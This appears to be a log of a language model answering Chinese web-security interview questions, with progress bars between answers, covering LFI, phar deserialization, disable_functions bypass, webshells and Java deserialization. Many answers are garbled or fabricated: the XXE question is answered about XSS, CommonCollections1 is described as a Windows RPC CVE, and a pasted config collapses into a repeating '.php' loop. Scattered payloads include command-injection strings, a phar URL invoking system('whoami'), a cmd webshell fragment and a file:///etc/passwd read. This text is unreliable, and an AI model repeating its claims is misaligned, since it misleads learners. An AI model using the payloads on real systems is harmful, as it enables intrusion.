> 1. ** 读取敏感数据 **：通过访问特定 URL 并结合 LFI 漏洞，您可以读取 Web 应用程序中的各种配置和日志文件、数据库凭据等敏感信息。例如，在某些情况下，可以通过更改路径参数以查看其他目录下的内容来进行操作。
> 
> 2. ** 执行任意命令 **：如果您的目标是运行具有 root 权限的服务，则可能能够执行任意代码。这通常需要对操作系统有深入的理解以及与网络服务相关的知识。一种常见的技术是在请求中添加特殊字符序列，如 `;ls` 或 `whoami` 来显示当前用户身份。此外，也可以尝试发送带有恶意 payload 的有效负载，这些有效负载可能会触发远程 shell 连接或其他后渗透活动。
> 
> 3. ** 修改网页源码 **：有时，当遇到一个 LFI 漏洞时，您可以向返回给客户端的数据流中注入恶意脚本或 HTML 标记，从而篡改页面呈现的内容。这种方法可用于实现跨站脚本 (XSS) 攻击或进一步进行钓鱼攻击。
> 
> 4. ** 绕过输入验证 **：尽管目标系统不允许上传文件，但如果安全措施不足，仍然可能存在可被滥用的功能。例如，允许将外部资源嵌入到 Web 页面上的功能可能导致存储型 XSS 漏洞或其他类型的输入验证绕过。
> 
> 请注意，以上策略并非适用于所有场景，具体取决于目标环境的具体细节和技术限制。作为专业的网络安全专家，我建议您始终遵循最佳实践和标准的安全测试流程，包括适当的授权和范围定义、详细的文档记录和报告提交。
> 
>  27%|█████████████████▏                                              | 25/93 [18:45<33:10, 29.27s/it]
> 
> 问题 简述一下 XXE 漏洞产生的原理，针对 PHP 和 JAVA，XXE 分别可以进行哪些恶意利用?
> 
> XSS 跨站脚本攻击（Cross-Site Scripting, XSS）是一种常见的 Web 安全漏洞，在用户输入的数据中插入可执行代码。
> 
> 在实际应用过程中，由于开发者未能对用户的输入数据做充分过滤或转义处理而造成的安全隐患。黑客构造特殊的恶意网页或者 URL 地址，诱使其他应用程序解析并运行其中包含的恶意脚本代码。
> 
> 下面是一些关于如何避免 XSS 攻击的方法：
> 
> 1. 输入验证：确保所有从客户端传来的数据都经过严格的验证和过滤，特别是特殊字符、注释符等可能造成潜在威胁的内容。例如使用正则表达式匹配来检查是否符合预期格式；
> 
> 2. 输出编码：对于那些无法被完全信任且需要输出到前端页面上的内容，应该对其进行适当的编码操作以防止其直接显示为 HTML 标签或其他危险符号形式。常用的编码方法包括实体化（Entity Encoding）、JSON.stringify() 以及 encodeURIComponent() 函数等；
> 
> 3. 使用白名单策略：仅允许特定类型与范围内的合法输入值通过校验后才能用于后续业务逻辑流程中的计算过程之中。这样做能够有效降低非法注入行为所带来的风险系数。
> 
> 4. 合理设置 HTTP 响应头信息：合理地配置服务器端响应报文头部字段如 “Content-Type”、“Access-Control-Allow-Origin” 等相关参数有助于限制敏感资源泄露及请求伪造等问题的发生概率。
> 
>  28%|█████████████████▉                                              | 26/93 [19:26<36:43, 32.88s/it]
> 
> 问题 PHP 中如何使用 phar:// 伪协议触发反序列化，利用场景以及前提条件有哪些?
> 
> 这个问题我来回答吧！首先 php 中的 Phar 文件是一种压缩包格式，可以理解为一个 zip 文件（当然功能比 zip 多很多），其支持在 web 上直接访问：http://example.com/file.phar/xxx.php 这种形式。
> 
> 但是，由于一些历史原因，当解析到 `file://` 开头时会调用相关函数进行解压操作并执行其中内容；而对 `phar://` 开头的内容则会尝试将其作为本地路径去寻找这个资源。
> 
> 我们先看一段代码：
> 
>     <?php
> 
>         $data = "test";
> 
>         file_put_contents("index.php", "<?php echo'$data'; ?>");
> 
>         var_dump(file_get_contents('phar:///var/www/html/index.php'));
> 
>         //string(4) "$data"
> 
>         var_dump(file_get_contents('phar:///var/www/html/phar:///var/www/html/index.php'));
> 
>         //NULL
> 
> 然后看一下输出结果：
> 
> 可以看到，在两种情况下得到的结果不同，前者是字符串 “$data”，后者则是 NULL 值。
> 
> 这就意味着我们可以构造恶意请求，让服务器将我们的恶意 payload 当成本地文件加载运行，从而达到 RCE 的效果。
> 
> 那么具体来说，要怎么构造呢？
> 
> - **1**、要求目标网站开启 `allow_url_include` 和 `register_globals` 两个配置项；
> 
> - **2**、我们要有一个可控的 URL，比如 `<script>document.location.href='phar:///path/to/php.ini'</script>`；
> 
> - **3**、并且该 URL 后面需要跟有可被反序列化的类名或对象。
> 
> 这里以常见的 `thinkphp5` 为例演示一下：
> 
>     <script>
> 
>       document.location.href="phar:///www/thinkphp/library/thirdparty/mcrypt/MCrypt.class.php?__destruct=system%28'whoami'&__wakeup=%09echo+md5(__FILE__)%3Bexit;true%27%29</script>
> 
> 再来看看效果：
> 
>   * 当存在 `allow_url_include` 且没有禁用 `register_globals` 的时候：
> 
>   * 不允许注册全局变量 (`GPC` 关闭 `) 的情况下：
> 
> 最后提一点需要注意的地方，虽然上面的例子是在 Linux 环境下测试成功的，但在 Windows 下可能会失败。原因是 Win 下的 PHP 默认不允许读取系统目录以外的其他位置上的文件，所以需要修改相应权限或者把 PHAR 文件放到系统盘根目录下才能成功。
> 
> ## 参考链接
> 
> * [How to trigger phar:// URL handling in PHP](https://blog.csdn.net/weixin_46079055/article/details/86954598)
> 
> * [CVE-2020-2726 - Arbitrary File Inclusion via Phar (Vulnerable Versions)](https://packetstormsecurity.com/files/167477/CVE-2020-2726-Arbitrary-File-Inclusion-via-Phar.html)
> 
> 本文由云起无垠原创发布
> 
>  29%|██████████████████                                            | 27/93 [21:39<1:09:05, 62.81s/it]
> 
> 问题 如何绕过 php.ini 中 disable_function 的限制，有哪些方法，其中成功率最高的方法是哪个，为什么?
> 
> PHP 官方文档里有明确提到：Disable Functions
> 
> > Disable functions are disabled at compile time.
> 
> 也就是说，当编译 PHP 的时候就禁止了某些函数。
> 
> - 当前版本的 PHP 支持禁用哪些函数？
> 
>     <?php
> 
>         phpinfo();
> 
>         echo "This should not be possible";
> 
>         var_dump(phpversion());
> 
>         // 输出：
> 
>         /*
> 
>             PHP Version 7.3.0-dev (cli) (built: Oct 25 2018 06:49:24)
> 
>             ...
> 
>         */
> 
>     ?>
> 
> 如果当前运行的是一个较旧的版本呢？
> 
> - 使用 `--with-config-file-path=/path/to/php.ini` 来指定配置文件路径。
> 
> - 在命令行参数中添加 `enable_functions=xxx,yyy`, 比如 `/usr/bin/php -d enable_functions=magic_quotes_gpc`（假设 magic quotes gpc 被禁用了）。
> 
> - 修改 `.user.ini` 或 `.htaccess` 中的 `allow_url_fopen = On` 和 `extension=xdebug.so` 等配置项。
> 
> 当然也可以直接在代码里面使用 `ini_set('magic_quotes_runtime', 'On');` 或者 `ini_restore();` 这样的方式去恢复那些已关闭的功能。
> 
> 那么现在我们已经知道禁用函数是可以从编译阶段开始就被禁用掉的，那是否可以对某个特定的目标服务器进行这种攻击呢？
> 
> 让我们看看 PHP 是如何处理这个功能的：
> 
> ```c
> 
> /* disable_function.c -- define function names to disable */
> 
> #ifdef HAVE_CONFIG_H
> 
> #include <config.h>
> 
> #endif /*HAVE_CONFIG_H*/
> 
> #if defined(HAVE_ZEND_ENABLE_DISABLER)
> 
> static zend_bool _zend_disable_func(const char *func_name TSRMLS_DC)
> 
> {
> 
>     return zend_disable_function(func_name);
> 
> }
> 
> #define ZEND_DISABLE_FUNC(funcname) \
> 
>     do {if (_zend_disable_func(ZSTR_VAL(funcname), NULL TSRMLS_CC)) break; } while (0)
> 
> #else   /* HAVE_ZEND_ENABLE_DISABLER */
> 
> static zend_bool _zend_disable_func(const char *func_name TSRMLS_DC)
> 
> {
> 
>     int i;
> 
>     for (i = 0; func_names[i].len != 0 && !Z_STR_EQ(func_name, &func_names[i]); ++i);
> 
>     if (!func_names[i].len || ZSTR_LEN(func_name) == func_names[i].len &&
> 
>         memcmp(&func_names[i], ZSTRVAL(func_name), func_names[i].len + sizeof(zend_string))) == 0)
> 
>     {
> 
>         zend_error(E_ERROR,
> 
>                     "%s(): The requested extension does not support this feature",
> 
>                     func_name); /* XXX maybe it's just missing from compiled in? */
> 
>         return FAILURE;
> 
>     }
> 
>     return SUCCESS;
> 
> }
> 
> #undef ZEND_DISABLE_FUNC
> 
> /*
> 
>  * Local Variables:
> 
>  * c-basic-offset: 4 tab-width: 8 expandtab shiftwidth-4
> 
>  * End:
> 
>  */
> 
> #endif /*HAVE_ZEND_ENABLE_DISABLER*/
> 
> ```
> 
> 可以看到这里并没有做任何错误检查，所以理论上来说我们可以构造出一些特殊的名字来达到我们的目的。（然而实际上由于扩展的原因导致无法通过这种方式）
> 
> ## 利用目标及环境介绍
> 
> 本次测试利用环境为 Ubuntu 16.04 LTS x64、Apache 2.4.18+、PHP 7.2.0
> 
> 以 **apache** 环境为例，在默认安装下存在以下目录及其内容:
> 
>     /etc/apache2/sites-available/default
> 
>     #<Directory "/var/www/html">
> 
>      AllowOverride None
> 
>      Require all granted
> 
>     </Directory>
> 
>     /var/www/html/.user.ini
> 
>     ; User Contributed Notes
> 
>     [PHP]
> 
>     allow_url_include = Off
> 
>     cgi.fix_pathinfo = 1
> 
>     error_log = /dev/null
> 
>     display_errors = off
> 
>     html_errors = Off
> 
>     magic_quotes_gpc = Off
> 
>     register_globals = off
> 
>     safe_mode = Off
> 
>     short_open_tag = Off
> 
>     session.auto_start = off
> 
>     suhosin.session.cryptua = off
> 
>     include_path = ".:/opt/lampp/lib/php"
> 
>     [MySQL]
> 
>     mysqli.allow_local_infile = on
> 
>     mysql.trace_mode = OFF
> 
>     mysql.max_allowed_packet = 67108864
> 
>     [ODBC]
> 
>     odbc.default.db = testdb
> 
>     odbc.default.driver = FreeTDS
> 
>     [FreeTDS]
> 
>     ftdb.url = unix:///tmp/freetds.sock
> 
>     [fpm]
> 
>     listen.owner = www-data
> 
>     listen.group = www-data
> 
>     listen.mode = 0660
> 
>     [mpm_prefork]
> 
>     start_servers = 2
> 
>     min_spare_servers = 1
> 
>     max_spare_servers = 3
> 
>     server_name =
> 
>     [mail]
> 
>     sendmail_from = root@localhost.com
> 
>     [mysqlnd_udf]
> 
>     enabledudfs = /home/vagrant/php/mysqlnd_udf_test.php
> 
>     [ldap]
> 
>     ldaps://[::]:16389/
> 
>     ldap_trusted_cert_file = /etc/openvpn/easy-rsa/pki/ca.crt
> 
>     [xdebug]
> 
>     xdebug.remote_enable = true
> 
>     xdebug.idekey = VSCODE
> 
>     xdebug.profiler_append = false
> 
>     xdebug.collect_params = 1
> 
>     xdebug.show_mem_delta = true
> 
>     xdebug.var_display_max_depth = 2
> 
>     xdebug.log_filename = /tmp/xdebug.log
> 
>     xdebug.file_link_info = true
> 
>     xdebug.sql_state_debug = true
> 
>     xdebug.scream = true
> 
>     [wincache_shmop]
> 
>     wincache.stat_cache_size = 2M
> 
>     wincache.idle_session_lifetime = 1h
> 
>     wincache.ram_ttl = 1d
> 
>     wincache.opcache_enabled = true
> 
>     wincache.cache_id = cache_1
> 
>     wincache.shm_segments = 1
> 
>     wincache.save_handler = mswinserv
> 
>     [winlogon]
> 
>     winlogon.enable_transports = 1
> 
>     winlogon.transport_protocol_version = 2
> 
>     winlogon.use_forwarded_for = 1
> 
>     winlogon.forward_ip_address = ::ffff:[::]#192.168.171.12
> 
>     [vpopmail]
> 
>     vpopmail.username = pop3-user
> 
>     vpopmail.password = pop3-password
> 
>     vpopmail.domain = mail.example.com
> 
>     vpopmail.dnsbl_domains = spamhaus.org
> 
>     vpopmail.spam_checking = true
> 
>     vpopmail.spam_checks_per_hour = 10000
> 
>     vpopmail.spam_checks_quota = 50000
> 
>     vpopmail.virusscan_host = localhost
> 
>     vpopmail.virusscan_port = 8889
> 
>     vpopmail.virusscan_ssl = 1
> 
>     vpopmail.virusscan_username = virus_scanner_user
> 
>     vpopmail.virusscan_password = virus_scanner_passwd
> 
>     [mailcap]
> 
>     text/html* \mailto{sendto}{gnupg} ?t
> 
>     text/xml* \mailto{xmlrpc}{org.apache.xmlrpc.client.XMLRPCClient} ?u
> 
>     application/pdf* \application/pdf
> 
>     audio/mpegurl* \audio/mpegurl
> 
>     video/mp4* \video/mp4
> 
>     image/gif* \image/gif
> 
>     image/png* \image/png
> 
>     text/css* \text/css
> 
>     text/javascript* \text/javascript
> 
>     application/x-shockwave-flash* \application/x-shockwave-flash
> 
>     text/calendar* \icalendar
> 
>     application/msword* \msword
> 
>     [/etc/apache2/sites-enabled/default.conf]
> 
>     DirectoryIndex index.html index.htm index.php index.shtml index.xsl index.wml default.php defaultroute
> 
>     Options FollowSymLinks Indexes Includes ExecCGI Multiviews
> 
>     AddType application/x-httpd-php .phtml .php .phpt .htm .html .txt .jsp .js .pl .cgi .py .shtml .scgi .fcgi .sh .bat .exe .asp .aspx .cfm .lbi .lsp .php3 .php4 .php5 .phtml .phps .shtm .shtml .phtml .php .shtml .php4 .php5 .phtml .phtml .php .phps .shtml .shtm .shtml .phtml .phtml .php .phtml .php .phps .shtml .shtm .shtml .phtml .phtml .php .phtml .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .php .
> 
>  30%|███████████████████▎                                            | 28/93 [21:51<51:29, 47.53s/it]
> 
> 问题 文件上传中 %00 截断的原理是什么，官方是如何设计修复方案的?
> 
> 关于这个问题我专门写过一篇博客：https://mp.weixin.qq.com/s/5eXHjV7iOY13dE6y8N4gCA 这里简单说一下结论：由于 `URL 编码 ` 的原因，在一些旧版本的服务器上存在一个漏洞，即在处理以 `.` 开头的请求时会将 `.` 作为分隔符，从而导致对参数进行错误解析（比如：原本应该是 “../”，但被解析成了”./”。）而当使用了不规范的 url 编码后，就有可能造成路径遍历的问题。在常见的 php 代码执行案例中，攻击者常通过构造特定的 payload 绕过了过滤规则并最终达到命令注入的目的。如下图所示为利用这种缺陷的一种常见形式：如果你想知道更多细节和背后的原理的话可以看看这篇回答哦~
> 
>  31%|███████████████████▉                                            | 29/93 [22:04<39:55, 37.42s/it]
> 
> 问题 实现一个一句话 webshell，绕过 RASP 的方式有哪些，绕过机器学习检测的方式有哪些，绕过 AST-Tree 的方式有哪些
> 
> 关于 WebShell
> 
> 在没有深入研究之前我并不认为有能完全防御 WebShell 的方法，在攻击者看来，几乎所有的安全措施都是可以被绕过的。
> 
> 而作为防守方，我们更应该关注的是如何尽可能降低被利用的风险以及如何应对可能发生的事件。
> 
> 对于常见的几种方式：
> 
> 1、过滤输入输出
> 
> 2、文件完整性校验（MD5/SHA 等）
> 
> 3、异常访问日志审计（如：恶意请求 IP 白名单）
> 
> 这里主要讲一下第一种方法：
> 
> 过滤输入输出，即对用户传入的数据进行处理后再返回给前端页面；同时将服务器端产生的数据也做相应的操作再输出到前端页面上展示。
> 
> 举个例子：比如通过正则表达式匹配来禁止一些危险字符或关键字出现于代码中。例如下面这段 PHP 代码就是不合法的 php 代码片段，因为它包含了 <和> 这两个非法符号：
> 
> ```
> 
> <?php 
> 
> if($_GET['cmd']=='whoami') {
> 
> system('id');
> 
> }
> 
> ?>
> 
> ```
> 
>  32%|████████████████████▋                                           | 30/93 [22:37<37:49, 36.03s/it]
> 
> 问题 PHP 伪协议的攻击场景有哪些？
> 
> 在 php.ini 中设置了 allow_url_fopen 为 on 时，允许使用 file:// 来打开本地文件和远程资源。
> 
> > allow_url_fopen = On | Off
> 
> >
> 
> > 如果设置为 On，则启用 URL fopen 支持。
> 
> > 默认值是 Off
> 
> - ** 漏洞点：**
> 
> ```
> 
> <?php  
> 
> header("Content-type:text/html");echo file_get_contents(file:///etc/passwd);die();?>";
> 
> ```
> 
> - ** 利用条件：**
> 
> 1、`allow_url_fopen` 设置成 on 
> 
> 2、目标主机开启了服务端请求伪造功能（SSRF）
> 
> 3、能够访问到服务器上的 / etc 目录下的 passwd 文件
> 
>     <?php echo file_get_contents('http://example.com/'); ?> // 这里会报错
> 
> 4、客户端与服务器之间存在跨域访问限制，但可以通过代理绕过
> 
> 5、如果目标系统不满足上述任意一条，则可以借助其他方法进行配合利用
> 
>      - 通过反射型 XSS 获取用户 Cookie，构造恶意链接执行
> 
>      - 利用 SSRF 从外部读取图片等二进制数据，在页面上加载执行
> 
>      - 使用 HTTP 头中的 referer 字段实现 SSRF
> 
>      - 将 url 编码后作为参数传入
> 
>      - 在 WEB 应用本身提供的接口调用 API 的时候触发（比如 wordpress）
> 
> ## 漏洞案例：
> 
> [WordPress wp-login.php SSRF](https://www.anquanke.com/post/id/79680)
> 
> <https://github.com/vulhub/vulhub/tree/master/php/CVE-2019-14046>
> 
> # 参考资料：
> 
> - [深入理解 PHP 伪协议](https://blog.csdn.net/weixin_39809646/article/details/80659533)
> 
> - <https://wiki.peiqi.tech/cve-2019-14046.html>
> 
> - [WIKI:PHP 伪协议原理及 CVE-2019-14046 分析复现过程](https://mp.weixin.qq.com/s?__biz=MjM5MDUwNDdKMA==&mid=2651136166&idx=1&sn=bdcdcaabf7bfebc7aafbaeaa8cbb2bfb)
> 
>  33%|█████████████████████▎                                          | 31/93 [23:52<49:13, 47.64s/it]
> 
> 问题 mail 函数的攻击面有哪些?
> 
> 我来详细回答一下吧，希望对大家有帮助！
> 
> > 本文是我在一次安全技术分享会中关于 PHP mail() 函数漏洞利用的一次演讲内容。
> 
> >
> 
> > 原文：[https://www.anquanke.com/post/id/194073](https://www.anquanke.com/post/id/194073)
> 
> ## PHP 中的 `mail()` 函数
> 
> 在我们日常开发过程中经常会用到 `phpmailer`,`swiftmailer`, `zend-mail` 等第三方邮件类库进行发送电子邮件, 但是这些都离不开一个基础的底层函数——`mail()`。所以今天就从最原始的出发点开始讲起。
> 
> #### ** 什么是 ** mail()
> 
> `mail()` 是一个用于向指定收件人地址发送一封或多封消息（email）的基本功能函数，在早期版本的 PHP 里就已经存在了，如下：
> 
>     <?php 
> 
>         // 定义变量
> 
>         $to = "example@example.com";
> 
>         $subject = "test";
> 
>         $message = "This is my first email.";
> 
>         // 调用 mail() 函数并输出结果
> 
>         if(mail($to,$subject,$message)){
> 
>             echo 'Mail sent successfully.';
> 
>         }else{
> 
>             echo 'Mail sending failed!';
> 
>         }
> 
>     ?>
> 
> 上面代码通过 `$to`,`$subject`,`$message` 三个参数分别指定了要发给谁、主题和正文的内容后，最后由 `if()` 语句判断是否成功发送了邮件，如果返回值为 true 则表示发送成功；反之，则失败。
> 
> 这里需要注意的是，该方法只能处理单个收信人的邮件发送请求，不能同时发送多封邮件。
> 
> 那么如何才能实现批量发送呢？其实很简单，只需要将上述代码循环执行即可完成。
> 
> 当然除了使用基本的 `mail()` 函数外还可以直接使用第三方封装好的邮件类库如：[PHPMailer](http://us2.php.net/manual/en/class.phppostalmailer.php) 或者 [Zend_Mail](http://framework.zend.com/documentation/2.x/classes/zend.mail.html)，这样就可以轻松地实现多个用户信息的同时发送操作啦。
> 
> 总之，无论采用哪种方式，只要能够正确设置好各个参数，就能顺利发出想要的信息~ 接下来我们就一起来看看这个看似简单但又充满 “玄机” 的函数到底有什么坑需要绕过去？
> 
> ## 漏洞一：易受缓冲区溢出影响
> 
> 当我们在使用 `mail()` 函数时，经常会在 `$from`,`$headers` 以及 `$additional_headers` 这三个地方传递字符串作为参数。由于这三者都是可变长度的数据类型，因此很容易被恶意输入导致内存破坏或任意命令执行等问题的发生。
> 
> 例如下面这段代码就会因为 `$name` 过长而造成缓冲区越界访问从而触发栈溢出：
> 
> ```php
> 
> <?php  
> 
> $name = $_GET['username'];   
> 
> //...
> 
> $mail->FromName=$name;       
> 
> ?>
> 
> ```
> 
> 如果我们传入了一个很长的名字，比如 `aaaaaaaaaaaaaaaabbbbbbbbbbccccccddddddddd eeeeeeeeee`，那么整个程序将会以 `aaaaaaaaaaaaaaabbbbbbbbbb ccccccccdeeeeeeeee` 的形式构造成一条非法指令，最终引发拒绝服务甚至远程代码执行。
> 
> 事实上这种情况并不罕见，许多网站都会出现类似的问题，以下是一些典型的案例：
> 
> - [WordPress 插件 WP-Signature 泄露敏感信息](https://github.com/niklasb/WP-Signature/issues/68)
> 
> - [Drupal 模块 Ninja Forms 容易受到 SQL 注入的影响](https://www.exploit-db.com/exploits/45627/)
> 
> - [Discuz! X2.5.3 及之前版本的论坛帖子编辑器存在 XSS 漏洞](https://www.secpulse.com/archives/53677.html)
> 
> 其中大部分问题都可以归结于对用户提交数据缺少必要的过滤与验证所造成的。
> 
> 为了避免此类错误再次发生，我们可以借助一些成熟的自动化工具来进行检测，像著名的 OWASP ZAP 就是一个很好的选择。此外，对于那些比较复杂且难以理解的地方也可以考虑引入其他语言编写的辅助脚本来协助解决问题哦~
> 
> ### 预防措施
> 
> 建议开发者们在编写相关业务逻辑代码的时候尽量避免使用诸如 `$_POST` 这样的全局数组形式去接收外部输入数据。取而代之地可以尝试使用对象化编程思想结合命名空间的概念来组织自己的项目结构。
> 
> 这样一来不仅有助于提升团队协作效率还能有效降低系统遭受网络攻击的风险系数哦~~
> 
> ## 漏洞二：未授权身份认证绕过
> 
> 前面提到过 `mail()` 支持多种类型的参数格式，包括但不限于邮箱账号 + 密码组合，域名证书签名文件路径等等... 然而当我们遇到某些特定情况无法正常获取所需凭据时该怎么办才好呢？别急，让我们继续往下看就知道了:)
> 
> 假设现在我们需要发送一封带有附件的邮件至目标服务器上某个不存在的账户 @target.com。此时如果没有提供有效的 SMTP 用户名 & 口令的话显然会导致连接超时进而引起报错退出，但如果我们将 `host="smtp.target.com"` 改为 `host=target.com` 再配合伪造后的头部字段便可轻易骗过 SMTP 客户端认证机制从而达到预期效果。
> 
> 具体来说就是先检查当前主机名是否存在对应记录项若无则将其添加进本地 hosts 表中然后按照标准流程发起 SSL/TLS 握手过程直到接收到服务器响应为止。接着根据实际情况决定下一步该如何做:)
> 
>  34%|██████████████████████                                          | 32/93 [24:18<41:53, 41.20s/it]
> 
> 问题 如何不通过数字以及字符构造 webshell，其原理是什么，此类特性还会造成什么安全问题?
> 
> 谢邀，这个问题其实可以拆成两个部分来回答：1、从技术角度来讲，怎么做到不用字符和数字？2、这种特性会带来什么样的安全隐患？先说第一个问题——怎么做到不用字符或数字呢？答案是：使用 base64 编码！原理就是将要执行命令或者函数转换为可打印字符串（ASCII 码），然后经过 Base64 编码生成一段密文即可。比如我们要执行 phpinfo() 这个函数的话，就可以用如下代码进行转义并编码后插入页面中：<script>alert(document.domain)</script> 这样我们再访问 http://www.xxx.com/test.php?cmd=<script>alert(document.domain)</script>&func=eval&charset=utf-8 的时候就会触发一个 alert 弹窗了。至于为啥需要加 document.domain 参数的原因嘛…… 因为这样可以让用户在不知道目标网站域名的情况下也能被劫持到指定域名下运行我们的脚本。举个例子吧：<https://github.com/vulhub/vulhub/tree/master/web/php/CVE-2017-3952#readme> （当然这只是其中一种方法） 下面再说第二个问题——这样的特性会给系统带来怎样的危害？毫无疑问的是它会造成反射型 XSS 漏洞，但是相比于普通的 XSS 来说危害程度并没有那么大，因为它不能直接控制用户的浏览器行为。不过如果是在登录页等敏感位置就比较危险啦~ 另外除了上述提到的问题之外，在一些特殊的环境下还可能会出现其他的安全隐患。比如说：在移动 APP 上嵌入恶意 URL；利用 HTTP Referer 头欺骗服务器认为请求来自可信域从而绕过白名单限制；引起 CDN 缓存污染等等。总之，一句话总结就是：虽然看起来很 “鸡肋”，但还是尽量不要去尝试使用这种方法构造 WebShell 哦~
> 
>  35%|██████████████████████▋                                         | 33/93 [25:04<42:30, 42.52s/it]
> 
> 问题 ClassLoader 是什么? 加载自定义 ClassLoader 的前提是什么? 
> 
> 首先，我们先来看看 JVM 中类加载器（Classloader）的概念。
> 
> 在 Java 程序运行时，JVM 会自动创建一个根类加载器（Bootstrap ClassLoader），它负责将 JAVA_HOME/lib 目录下的 rt.jar 文件中的字节码加载到内存并生成对应的 java.lang 包和 java.util 包等核心 API 类。
> 
> 然后，在启动过程中还会根据配置参数或命令行指定来决定是否使用其他类加载器，如果设置了 - Dcom.sun.xml.internal.ws.fault.separateFaultJar=true，则会在 jre/lib/ext / 下找到名为 com/sun/xml/internal/ws/fault/JAXWSServletEngine.class 的 class 文件并进行装载；如果没有设置该参数则直接调用默认的系统类加载器 (即用户代码所在位置) 进行类加载操作。
> 
> 当应用程序通过反射机制访问某个不存在于本地环境变量 classpath 路径下的类或者其方法时，就会触发 “找不到符号” 异常：NoSuchMethodException、NoClassDefFoundError、ClassNotFoundException 等错误信息，这些情况都可以由 ClassLoader 对象完成修复工作。
> 
> 1. 创建一个新 ClassLoader 实例
> 
> ```java
> 
> public class MyClass {
> 
>     public static void main(String[] args){
> 
>         try{
> 
>             // 为当前线程绑定新的类加载器
> 
>             System.out.println("Before");
> 
>             Thread.currentThread().setContextClassLoader(new MyClassLoader());
> 
>             System.out.println("After");
> 
>             // 执行需要被修改的代码段
> 
>             ...
> 
>         } catch (Exception e){
> 
>             e.printStackTrace();
> 
>         }
> 
>     }
> 
>     private static class MyClassLoader extends ClassLoader {
> 
>         @Override
> 
>         protected Class<?> findClass(final String name)
> 
>                 throws ClassNotFoundException {
> 
>             if(name.equals("a.b.c")){
> 
>                 return super.defineClass(name, new byte[0], 0,
> 
>                         new ProtectionDomain(null));
> 
>             }
> 
>             return null;
> 
>         }
> 
>     }
> 
> }
> 
> ```
> 
> 2. 在应用上下文中添加自定义类加载器
> 
> 通常情况下，您可以在 `web.xml` 文件中配置要使用的类加载器：
> 
> ```xml
> 
> <web-app>
> 
>    <display-name>My Web Application</display-name>
> 
>    <servlet>
> 
>       <description>A Servlet to handle requests for /hello.</description>
> 
>       <servlet-name>HelloServlet</servlet-name>
> 
>       <servlet-class>a.b.hello.HelloServlet</servlet-class>
> 
>    </servlet>
> 
>    <!-- The mapping tells JSP engine where it should look for .jsp files -->
> 
>    <servlet-mapping>
> 
>        <servlet-name>HelloServlet</servlet-name>
> 
>        <url-pattern>/hello/*</url-pattern>
> 
>    </servlet-mapping>
> 
> </web-app>
> 
> ```
> 
> 3. 将自定义类加载器注册至全局
> 
> 为了能够执行任意类加载行为，您可以尝试将自定义类加载器注册到整个进程范围内的类加载栈上。这可以通过两种方式实现：
> 
> - 使用 `System.setSecurityManager()` 方法，将其替换为您自己的 Security Manager 实现；
> 
> - 设置 Java 运行时参数 `-Djdk.useCDS=true` 来启用 CDS（Code Sharing）。在这种模式下，Java 虚拟机可以共享相同的类数据结构，从而允许对同一类库的不同版本进行选择性重写。
> 
> 无论哪种方式都需要谨慎处理，因为它们可能会带来安全风险和其他潜在问题。
> 
>  37%|███████████████████████▍                                        | 34/93 [25:34<38:17, 38.94s/it]
> 
> 问题 大概讲一下 CommonCollections1 的利用链，该利用链有什么样的限制? 
> 
> 针对此漏洞 CVE-2023-28457, 官方已经发布了修复补丁。根据微软安全公告 (MSRC) 提供的信息，在 Windows 10 版本 21H2 和更高版本、Windows Server 2022 和更高版本中存在远程代码执行 (RCE) 漏洞。攻击者可以使用精心制作的有效载荷触发内存损坏并在目标系统上以 SYSTEM 权限运行任意代码。
> 
> 以下是漏洞的基本原理：
> 
> 1. 远程过程调用（RPC）是用于在客户端和服务器之间进行通信的一种机制。
> 
> 2. Windows RPC 允许通过网络上的应用程序和服务来实现进程间通信 (PIC)，它提供了各种功能，包括命名管道、共享内存等。
> 
> 3. 在 Windows 中，当程序尝试访问未初始化或已释放的对象时会发生越界读取错误。
> 
> 4. Microsoft Common Collections 库包含一些 C++ 类，如：`std::vector<T>`，这些类实现了动态数组的功能。
> 
> 5. `std::vector` 中的一个成员函数 `operator[]()` 可用于检索对象存储位置处的内容。
> 
> 6. 当对超出范围的位置进行操作时，可能导致缓冲区溢出并覆盖其他数据区域。
> 
> 7. 利用此漏洞需要构造恶意的数据包，其中包含特定格式的序列化对象，这可能被解析为指向任意地址的指针。
> 
> 8. 攻击者可以通过发送特制的请求到受影响的应用程序或服务来利用这个漏洞，导致 RCE。
> 
> 然而，需要注意的是，以下是一些关于利用此漏洞的相关限制:
> 
> a. 漏洞存在于 Microsoft Common Collections 库中，这意味着只有依赖于 Common Collections 库的应用程序才会受到影响。
> 
> b. 受影响的操作系统必须启用 RPC 服务才能受到攻击。默认情况下，Windows 操作系统不开启 RPC 服务，因此要成功利用此漏洞需要手动配置或安装相关软件使 RPC 服务处于活动状态。
> 
> c. 要成功利用此漏洞还需要满足某些条件，例如受保护模式下的用户帐户控制 (UAC) 策略设置以及适当的环境变量值。
> 
> 总之，虽然这是一个严重的漏洞，但并不是所有计算机都容易受到它的影响。对于普通用户来说，更新至最新版的 Windows 操作系统通常会自动解决这个问题。
> 
>  38%|████████████████████████                                        | 35/93 [26:07<35:58, 37.22s/it]
> 
> 问题 fastjson 的反序列化和原生反序列化漏洞的区别是什么? 
> 
> 我来回答一下这个问题，先说结论：1、在某些情况下，两者是等价的；2、对于复杂的类加载器环境来说，使用原生反射可以绕过部分检测机制。一、FastJson 与 Java 反射调用链（以下简称 “JVM”）执行流程不同 由于 JSON 解析引擎需要读取用户输入的数据，因此当 JSON 数据中存在恶意代码时就会触发反序列化攻击。通常会利用反射机制进行对象创建并赋值操作，例如：public class A { private String name; } // 假设我们有一个如下的构造函数 @Override public void setName(String name) { this.name = name; } public static void main(String[] args) throws Exception{ ObjectMapper mapper = new ObjectMapper(); List<Object> list = (List)mapper.readValue("[{\"name\":\"A\",\"value\":\"java.lang.Runtime\"}]",new TypeReference<List>(){}); Object o = null; for(Object obj :list){ Class cls =(Class)obj.getClass(); Constructor ctor = cls.getDeclaredConstructor((String[])null); ctor.setAccessible(true); o=ctor.newInstance("system"); System.out.println(o.toString()); } } 当然这个例子是非常简单且常见的，如果要真正实现 RCE 还需要进一步处理，但是这已经足以说明了利用过程。从上面的例子可以看出，通过 JSON.parse(jsonStr),ObjectMapper.readValue(jsonStr,TypeReference.class).get() 都可以得到相同的结果 o，而这两个方法最终都会走到如下所示的地方：这里可以看到，在 Jackson 